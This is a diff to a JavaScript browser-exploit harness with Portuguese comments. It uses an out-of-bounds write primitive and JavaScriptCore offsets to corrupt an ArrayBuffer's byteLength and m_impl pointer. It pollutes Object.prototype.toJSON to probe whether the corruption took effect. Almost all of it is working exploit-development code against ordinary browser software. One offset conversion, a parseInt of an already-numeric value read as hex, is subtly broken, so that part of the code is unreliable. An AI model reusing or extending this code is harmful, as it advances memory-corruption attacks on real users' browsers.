@@ -3,13 +3,16 @@ import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real,
+    oob_array_buffer_real, // Este será o nosso alvo principal de sondagem agora
+    oob_dataview_real,     // A view sobre o oob_array_buffer_real
     oob_write_absolute,
-    clearOOBEnvironment
+    clearOOBEnvironment,
+    getBaseOffsetInDV,      // Para saber onde a view começa
+    getOOBAllocationSize  // Para saber o tamanho da view
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Adicionado JSC_OFFSETS para referência futura
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---
+// --- Variantes da toJSON para sondar 'this' (que esperamos ser um ArrayBuffer) ---
 
 export function toJSON_AB_Probe_V1() {
     const FNAME_toJSON = "toJSON_AB_Probe_V1";
@@ -34,8 +37,12 @@ export function toJSON_AB_Probe_V1() {
     try {
         result.byteLength_prop = this.byteLength;
 
-        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
-            const dv = new DataView(this);
+        // Ajuste: Se o byteLength for muito grande (potencialmente corrompido),
+        // o DataView pode falhar ou ser muito lento. Limitar o teste de R/W.
+        const testableLength = typeof result.byteLength_prop === 'number' ? Math.min(result.byteLength_prop, 1024) : 0;
+
+        if (testableLength >= 4) {
+            const dv = new DataView(this, 0, testableLength); // Usar o 'this' diretamente
             result.is_dataview_created = true;
             dv.setUint32(0, result.dv_write_val, true);
             result.dv_read_val = dv.getUint32(0, true);
@@ -43,7 +50,7 @@ export function toJSON_AB_Probe_V1() {
                 result.dv_rw_match = true;
             }
         } else {
-            result.error = `Invalid byteLength for DataView ops: ${result.byteLength_prop}`;
+            result.error = `byteLength (${result.byteLength_prop}) too small or invalid for DataView ops.`;
         }
     } catch (e) {
         result.error = `${e.name}: ${e.message}`;
@@ -75,14 +82,15 @@ export function toJSON_AB_Probe_V2_Detailed() {
 
     try {
         result.byteLength_prop = this.byteLength;
+        const testableLength = typeof result.byteLength_prop === 'number' ? Math.min(result.byteLength_prop, 1024) : 0;
 
-        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
-            const dv = new DataView(this);
+        if (testableLength >= 4) {
+            const dv = new DataView(this, 0, testableLength);
             result.is_dataview_created = true;
             dv.setUint32(0, 0xFEEDFACE, true);
             if (dv.getUint32(0, true) === 0xFEEDFACE) result.dv_rw_match = true;
         } else {
-             result.error = `Invalid byteLength for DataView ops: ${result.byteLength_prop}`;
+             result.error = `byteLength (${result.byteLength_prop}) too small or invalid for DataView ops.`;
         }
 
         try {
@@ -106,16 +114,18 @@ export function toJSON_AB_Probe_V2_Detailed() {
     return result;
 }
 
-export async function executeVictimABInstabilityTest(victim_ab, corruption_offset_in_oob_ab, value_to_write, victim_ab_size_val, toJSONFunctionName, toJSONFunctionToUse) {
+// objectToProbe: O objeto que será passado para JSON.stringify (agora o oob_array_buffer_real)
+// expectedObjectSize: O tamanho esperado do objectToProbe ANTES da corrupção
+export async function executeVictimABInstabilityTest(objectToProbe, expectedObjectSize, corruption_offset_in_oob_ab, value_to_write, toJSONFunctionName, toJSONFunctionToUse) {
     const FNAME_TEST = "executeVictimABInstabilityTest";
     logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer ---`, "subtest", FNAME_TEST);
-    logS3(`  Alvo: victim_ab (tamanho esperado: ${victim_ab_size_val})`, "info", FNAME_TEST);
+    logS3(`  Alvo da Sondagem: ${objectToProbe === oob_array_buffer_real ? "oob_array_buffer_real" : "outro objeto"} (tamanho original esperado: ${expectedObjectSize})`, "info", FNAME_TEST);
     logS3(`  Corrupção: Escrever ${toHex(value_to_write)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]`, "info", FNAME_TEST);
     logS3(`  Sonda JSON: ${toJSONFunctionName}`, "info", FNAME_TEST);
 
     let result = {
         stringifyError: null,
-        parsedToJSONReturn: null, // Renomeado para clareza
+        parsedToJSONReturn: null,
         corruption_offset: corruption_offset_in_oob_ab,
         value_written: value_to_write,
         probe_function: toJSONFunctionName,
@@ -127,18 +137,15 @@ export async function executeVictimABInstabilityTest(victim_ab, corruption_offse
     const ppKey_val = "toJSON";
 
     try {
-        if (!triggerOOB_primitive()) {
-            logS3("Falha ao inicializar ambiente OOB. Abortando sub-teste.", "critical", FNAME_TEST);
-            result.stringifyError = { name: "OOBSetupError", message: "triggerOOB_primitive failed" };
-            return result;
-        }
-        if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, 4)) {
+        // A triggerOOB_primitive() é chamada antes pelo runAllInstabilityTestsOnVictimAB para garantir que oob_array_buffer_real exista.
+        // A escrita de corrupção é feita no oob_array_buffer_real
+        if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, 4)) { // Assumindo escrita de 32-bit
             logS3("Falha ao escrever valor de corrupção. Abortando sub-teste.", "error", FNAME_TEST);
             result.stringifyError = { name: "OOBWriteError", message: "oob_write_absolute failed" };
             return result;
         }
         logS3("   Valor de corrupção escrito com sucesso.", "good", FNAME_TEST);
-        await PAUSE_S3(SHORT_PAUSE_S3);
+        await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa após corrupção
 
         originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
         Object.defineProperty(Object.prototype, ppKey_val, {
@@ -150,22 +157,30 @@ export async function executeVictimABInstabilityTest(victim_ab, corruption_offse
         pollutionApplied = true;
         logS3(`   Object.prototype.toJSON poluído com ${toJSONFunctionName}.`, "info", FNAME_TEST);
 
-        logS3("   Chamando JSON.stringify(victim_ab)...", "info", FNAME_TEST);
-        let rawToJSONReturn = null;
+        logS3(`   Chamando JSON.stringify no objeto alvo...`, "info", FNAME_TEST);
+        let rawStringifyOutput = null;
         try {
-            rawToJSONReturn = JSON.stringify(victim_ab); // Isso chama nossa toJSON, que retorna um objeto
-            // Agora tentamos parsear o que a NOSSA toJSON retornou, que JSON.stringify transformou em string.
-            // No entanto, JSON.stringify já retorna o objeto que nossa toJSON retornou, não uma string dele.
-            // A linha anterior `result.toJSONReturn = stringify_output` estava correta. O `typeof` é que estava me enganando no log.
-            // JSON.stringify(obj) -> chama obj.toJSON() -> se toJSON retorna um objeto, ELA É USADA.
-            // Portanto, rawToJSONReturn já é o objeto da nossa sonda.
-            result.parsedToJSONReturn = rawToJSONReturn;
+            // O objectToProbe é agora o oob_array_buffer_real (ou deveria ser para Estratégia 1)
+            rawStringifyOutput = JSON.stringify(objectToProbe);
 
-            logS3(`   JSON.stringify invocou toJSON. Retorno da toJSON (tipo: ${typeof result.parsedToJSONReturn}): ${typeof result.parsedToJSONReturn === 'object' ? JSON.stringify(result.parsedToJSONReturn) : result.parsedToJSONReturn}`, "info", FNAME_TEST);
+            // O retorno de JSON.stringify, quando toJSON retorna um objeto, É ESSE OBJETO.
+            // No entanto, o log indicou "tipo: string", então vamos tentar o parse.
+            if (typeof rawStringifyOutput === 'string') {
+                try {
+                    result.parsedToJSONReturn = JSON.parse(rawStringifyOutput);
+                } catch (parseError) {
+                    logS3(`      Falha ao fazer JSON.parse do retorno de stringify (que era uma string): ${parseError}. Usando a string bruta.`, "warn", FNAME_TEST);
+                    result.parsedToJSONReturn = { error: `Parse error on toJSON return: ${rawStringifyOutput}` }; // Tratar como erro
+                }
+            } else {
+                result.parsedToJSONReturn = rawStringifyOutput; // Já é um objeto
+            }
+
+            logS3(`   JSON.stringify invocou toJSON. Objeto retornado pela sonda (após parse, se necessário): ${JSON.stringify(result.parsedToJSONReturn)}`, "info", FNAME_TEST);
 
         } catch (e_str) {
             result.stringifyError = { name: e_str.name, message: e_str.message, stack: e_str.stack };
-            logS3(`   !!!! ERRO AO STRINGIFY victim_ab !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
+            logS3(`   !!!! ERRO AO STRINGIFY objeto alvo !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
             if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
         }
 
@@ -179,28 +194,28 @@ export async function executeVictimABInstabilityTest(victim_ab, corruption_offse
         }
     }
     
-    // Análise do resultado
-    const tr = result.parsedToJSONReturn; // Alias para o objeto retornado pela nossa sonda
+    const tr = result.parsedToJSONReturn;
 
     if (tr && typeof tr === 'object' && tr !== null) {
         if (!tr.is_identified_as_array_buffer) {
             result.final_verdict_is_problem = true;
-            logS3(`      toJSONReturn indica que 'this' não foi identificado como ArrayBuffer (tipo real: ${tr.this_type_entry}).`, "error", FNAME_TEST);
-        } else if (tr.error) {
+            logS3(`      SONDA: 'this' não foi identificado como ArrayBuffer (tipo real: ${tr.this_type_entry}).`, "error", FNAME_TEST);
+        } else if (tr.error) { // Erro interno na sonda APÓS ser identificado como AB
             result.final_verdict_is_problem = true;
-            logS3(`      toJSONReturn reportou erro interno: ${tr.error}.`, "error", FNAME_TEST);
+            logS3(`      SONDA: Reportou erro interno: ${tr.error}.`, "error", FNAME_TEST);
         } else if (tr.loop_error && tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
              result.final_verdict_is_problem = true;
-             logS3(`      toJSONReturn (V2) reportou erro no loop: ${tr.loop_error}.`, "error", FNAME_TEST);
-        } else { // Identificado como AB e sem erros diretos, checar anomalias
+             logS3(`      SONDA (V2): Reportou erro no loop: ${tr.loop_error}.`, "error", FNAME_TEST);
+        } else { 
             let anomaly_found = false;
-            if (tr.byteLength_prop !== victim_ab_size_val) {
+            // Usar expectedObjectSize para a checagem do byteLength_prop
+            if (tr.byteLength_prop !== expectedObjectSize) {
                 anomaly_found = true;
-                logS3(`      ANOMALIA: byteLength_prop (${tr.byteLength_prop}) !== esperado (${victim_ab_size_val})`, "critical", FNAME_TEST);
+                logS3(`      ANOMALIA: byteLength_prop (${tr.byteLength_prop}) !== tamanho original esperado (${expectedObjectSize})`, "critical", FNAME_TEST);
             }
             if (!tr.dv_rw_match) {
                 anomaly_found = true;
-                logS3(`      ANOMALIA: dv_rw_match é false. Leitura/escrita no DataView falhou ou retornou valor incorreto.`, "critical", FNAME_TEST);
+                logS3(`      ANOMALIA: dv_rw_match é false. Leitura/escrita no DataView falhou ou valor incorreto.`, "critical", FNAME_TEST);
             }
             if (tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
                 if (tr.this_type_in_loop !== "[object ArrayBuffer]" && tr.this_type_in_loop !== "N/A" && tr.for_in_iterations > 0) {
@@ -217,17 +232,15 @@ export async function executeVictimABInstabilityTest(victim_ab, corruption_offse
             }
         }
     } else {
-        logS3(`      toJSONReturn não é um objeto válido ou é nulo. Valor: ${tr}`, "warn", FNAME_TEST);
-        // Se não há toJSONReturn mas houve um erro de stringify, isso já é um problema.
-        if (!result.stringifyError) {
-            // Poderia marcar como problema se esperamos sempre um objeto da sonda.
-            // result.final_verdict_is_problem = true;
+        logS3(`      Retorno da sonda (parsedToJSONReturn) não é um objeto válido ou é nulo. Valor: ${JSON.stringify(tr)}`, "warn", FNAME_TEST);
+        if (!result.stringifyError) { // Se não houve erro de stringify, mas não temos um objeto da sonda, é estranho.
+             result.final_verdict_is_problem = true; // Considerar isso um problema.
         }
     }
 
     if (result.stringifyError && result.stringifyError.name === 'RangeError') {
-        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para victim_ab!`, "vuln", FNAME_TEST);
-        document.title = `RangeError with ${toJSONFunctionName} on victim_ab!`;
+        logS3(`   ---> RangeError OCORREU!`, "vuln", FNAME_TEST);
+        document.title = `RangeError ${toJSONFunctionName} (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
         result.final_verdict_is_problem = true;
     } else if (result.stringifyError) {
         logS3(`   ---> Erro durante JSON.stringify: ${result.stringifyError.name} - ${result.stringifyError.message}`, "error", FNAME_TEST);
@@ -235,10 +248,10 @@ export async function executeVictimABInstabilityTest(victim_ab, corruption_offse
     }
 
     if (result.final_verdict_is_problem) {
-        logS3(`   PROBLEMA DETECTADO com ${toJSONFunctionName} para victim_ab.`, "critical", FNAME_TEST);
-        document.title = `PROBLEMA ${toJSONFunctionName} victim_ab (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
+        logS3(`   PROBLEMA DETECTADO com ${toJSONFunctionName}. Corrupção: ${toHex(value_to_write)} @ offset ${toHex(corruption_offset_in_oob_ab)}`, "critical", FNAME_TEST);
+        document.title = `PROBLEMA ${toJSONFunctionName} (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
     } else {
-        logS3(`   ${toJSONFunctionName} para victim_ab completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
+        logS3(`   ${toJSONFunctionName} para objeto alvo completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
     }
 
     logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer CONCLUÍDO ---`, "subtest", FNAME_TEST);
@@ -247,23 +260,43 @@ export async function executeVictimABInstabilityTest(victim_ab, corruption_offse
 
 export async function runAllInstabilityTestsOnVictimAB() {
     const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
-    logS3(`==== INICIANDO Teste Completo de Instabilidade em ArrayBuffer Vítima ====`, "test", FNAME_RUNNER);
+    logS3(`==== INICIANDO Teste Completo de Instabilidade em ArrayBuffer Vítima (Estratégia 1: Sondando oob_array_buffer_real) ====`, "test", FNAME_RUNNER);
 
-    const victim_ab_size = 64; // Tamanho padrão do ArrayBuffer vítima
-    let victim_ab = null;
     let overall_problem_found = false;
 
+    // Offsets são DENTRO do oob_array_buffer_real.
+    // O oob_array_buffer_real é o buffer onde as escritas OOB acontecem.
+    // Ele tem um tamanho de (getBaseOffsetInDV() + getOOBAllocationSize() + 256).
+    // Queremos tentar corromper os metadados do próprio oob_array_buffer_real.
+    // Os metadados de um JSArrayBuffer (como seu m_byteLength) estão no início do objeto JSArrayBuffer.
+    // Se o oob_array_buffer_real *é* o objeto JSArrayBuffer, então escrever em offsets pequenos como 0x18 (SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)
+    // a partir do *início do objeto JSArrayBuffer* poderia afetar seu tamanho.
+    // O desafio é que oob_write_absolute usa offsets a partir do INÍCIO do ArrayBuffer bruto, não do objeto JSArrayBuffer.
+    // Vamos assumir, para este teste, que o objeto JSArrayBuffer para oob_array_buffer_real começa em 0 DENTRO do buffer alocado por new ArrayBuffer().
+    // Esta é uma simplificação e pode não ser verdade em implementações reais de motor JS.
+
     const corruption_params_to_try = [
-        { name: "Offset -16 (0x70), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0xFFFFFFFF },
-        { name: "Offset -16 (0x70), Val 0x00000000", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x00000000 },
-        { name: "Offset -16 (0x70), Val 0x12345678", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x12345678 },
-        { name: "Offset +0 (0x80 Base DV), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128), value: 0xFFFFFFFF },
-        // Tentar corromper o JSArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START (0x18)
-        // Se victim_ab estivesse em 0x90 (hipoteticamente após oob_dataview_real), seu byteLength estaria em 0x90 + 0x18 = 0xA8
-        // Nosso oob_array_buffer_real é o único buffer sendo escrito.
-        // Vamos tentar um offset que seria o byteLength do ArrayBuffer se ele fosse o OOB_CONFIG.BASE_OFFSET_IN_DV
-        { name: "Offset byteLength (0x18) de um AB em BASE_OFFSET_IN_DV, Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18), value: 0xFFFFFFFF},
-        { name: "Offset byteLength (0x18) de um AB em BASE_OFFSET_IN_DV, Val 0x00000100 (256)", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18), value: 0x00000100},
+        // Tentar corromper o byteLength (offset 0x18 a partir do início do objeto JSArrayBuffer)
+        // do próprio oob_array_buffer_real.
+        { name: "Corromper byteLength do oob_ab para 0xFFFFFFFF",
+          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18, // Offset DENTRO do objeto JSArrayBuffer
+          value: 0xFFFFFFFF },
+        { name: "Corromper byteLength do oob_ab para 0 (zero)",
+          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18,
+          value: 0x00000000 },
+        { name: "Corromper byteLength do oob_ab para 1024",
+          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18,
+          value: 1024 },
+        { name: "Corromper byteLength do oob_ab para um valor ENORME (requer escrita 64bit)", // Exige que oob_write_absolute suporte 64bit
+          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18,
+          value: new AdvancedInt64(0xFFFFFFFF, 0x000000FF), size: 8 }, // Escreve 8 bytes
+        // Tentar corromper o ponteiro m_impl (offset 0x10)
+        { name: "Corromper m_impl do oob_ab para NULL",
+          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || 0x10,
+          value: new AdvancedInt64(0,0), size: 8}, // m_impl é um ponteiro (64-bit)
+        { name: "Corromper m_impl do oob_ab para um valor inválido",
+          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || 0x10,
+          value: new AdvancedInt64(0xBADBAD00, 0xBADBAD00), size: 8},
     ];
 
     const toJSON_Probes = [
@@ -273,42 +306,57 @@ export async function runAllInstabilityTestsOnVictimAB() {
 
     for (const params of corruption_params_to_try) {
         logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);
-        // O victim_ab é o alvo da chamada JSON.stringify.
-        // A corrupção ocorre no oob_array_buffer_real.
-        // Para este teste ter sentido, o victim_ab DEVE ser o oob_array_buffer_real ou uma view sobre ele,
-        // OU precisamos de um spray para que victim_ab (separado) fique adjacente.
-        // Por ora, vamos assumir que estamos tentando corromper o oob_array_buffer_real e sondando-o.
-        // No entanto, o teste cria um 'new ArrayBuffer(victim_ab_size)' que é o 'victim_ab' sondado.
-        // Isso significa que a escrita OOB no 'oob_array_buffer_real' precisa afetar este 'victim_ab' separado.
-        // Isso requer que o 'victim_ab' esteja adjacente à escrita.
-        // VAMOS manter a lógica como está por enquanto, mas cientes dessa desconexão.
-        victim_ab = new ArrayBuffer(victim_ab_size);
-        logS3(`   Novo victim_ab (${victim_ab_size} bytes) criado. Este é o objeto que será passado para JSON.stringify.`, "info", FNAME_RUNNER);
-        logS3(`   Lembrete: A escrita OOB ocorre em 'oob_array_buffer_real'. A detecção de corrupção depende da adjacência e do vazamento da escrita.`, "warn", FNAME_RUNNER);
 
+        // 1. Garantir que o oob_array_buffer_real (nosso alvo de corrupção e sondagem) exista.
+        //    Cada iteração de corrupção operará sobre um oob_array_buffer_real "fresco".
+        clearOOBEnvironment();
+        if (!triggerOOB_primitive()) {
+            logS3("Falha crítica ao criar oob_array_buffer_real. Abortando teste.", "critical", FNAME_RUNNER);
+            break;
+        }
+        // O oob_array_buffer_real agora existe e é o nosso alvo.
+        const current_oob_ab_size = oob_array_buffer_real.byteLength; // Tamanho ANTES da corrupção
+        logS3(`   Alvo da sondagem e corrupção: oob_array_buffer_real (tamanho inicial: ${current_oob_ab_size})`, "info", FNAME_RUNNER);
+
+
+        // O params.offset_in_JSObject é o offset DENTRO da estrutura JSArrayBuffer.
+        // oob_write_absolute espera um offset a partir do INÍCIO do buffer de dados brutos.
+        // Assumindo que o objeto JSArrayBuffer para oob_array_buffer_real começa no offset 0 do buffer bruto.
+        const actual_write_offset = parseInt(params.offset_in_JSObject, 16); // Converter de string hex para número
 
         for (const probe of toJSON_Probes) {
+            // É importante recriar o oob_array_buffer_real ANTES de cada escrita + sonda
+            // para garantir que estamos testando o efeito da escrita atual.
+            // No entanto, se queremos que a escrita persista para a sonda, não devemos limpar/recriar aqui.
+            // A limpeza agora é feita no final do loop de `params`.
+            // A escrita de corrupção é feita dentro de executeVictimABInstabilityTest.
+
             const test_result = await executeVictimABInstabilityTest(
-                victim_ab, // Este é o objeto que JSON.stringify opera.
-                params.offset, // Offset da escrita OOB DENTRO de oob_array_buffer_real
-                params.value,
-                victim_ab_size, // Tamanho esperado do victim_ab
+                oob_array_buffer_real,    // Sondar o próprio buffer que tentamos corromper
+                current_oob_ab_size,      // Passar o tamanho original para comparação
+                actual_write_offset,      // Offset de escrita DENTRO do oob_array_buffer_real
+                params.value,             // Valor a ser escrito
                 probe.name,
                 probe.func
             );
             if (test_result.final_verdict_is_problem) {
                 overall_problem_found = true;
             }
-            await PAUSE_S3(MEDIUM_PAUSE_S3);
+            await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre sondas
+
+            // Se o oob_array_buffer_real foi severamente corrompido (ex: ponteiro m_impl nulo),
+            // pode ser instável para a próxima sonda. Considerar recriar se necessário,
+            // ou aceitar que a segunda sonda pode falhar de forma diferente.
+            // Por ora, a próxima sonda usará o buffer no estado em que a escrita o deixou.
         }
-        clearOOBEnvironment();
-        await PAUSE_S3(SHORT_PAUSE_S3);
+        // clearOOBEnvironment() foi movido para o início do loop de params.
     }
 
     if (overall_problem_found) {
-         logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
+         logS3(`==== Teste Completo de Instabilidade CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
          document.title = "PROBLEMA(S) DETECTADO(S) - Teste AB Instability";
     } else {
-        logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO NAS SONDAGENS. ====`, "good", FNAME_RUNNER);
+        logS3(`==== Teste Completo de Instabilidade CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO. ====`, "good", FNAME_RUNNER);
     }
+    clearOOBEnvironment(); // Limpeza final
 }
